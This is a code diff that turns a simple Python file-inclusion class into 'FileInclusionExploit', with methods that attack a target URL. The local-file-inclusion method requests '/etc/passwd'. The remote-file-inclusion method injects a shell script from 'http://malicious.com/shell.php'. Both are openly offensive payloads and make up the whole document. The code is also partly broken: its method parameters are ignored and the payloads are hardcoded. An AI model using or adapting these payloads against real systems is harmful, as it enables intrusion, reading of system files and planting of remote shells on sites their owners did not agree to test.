@@ -1,13 +1,13 @@
-class FileInclusion:
-    def __init__(self):
-        pass
+class FileInclusionExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url
 
-    def include_file(self, url, file_name):
-        # Simulate file inclusion attack
-        file_url = f"{url}?file={file_name}"
-        print(f"Attempting Local File Inclusion on: {file_url}")
-        response = requests.get(file_url)
-        if response.status_code == 200:
-            print(f"File inclusion successful on: {file_url}")
-        else:
-            print(f"File inclusion failed on: {file_url}, Status Code: {response.status_code}")
+    def exploit_lfi(self, file_name):
+        payload = f"/etc/passwd"
+        response = requests.get(self.target_url, params={"file": payload})
+        return "root" in response.text
+
+    def exploit_rfi(self, file_url):
+        payload = f"http://malicious.com/shell.php"
+        response = requests.get(self.target_url, params={"file": payload})
+        return "shell" in response.text
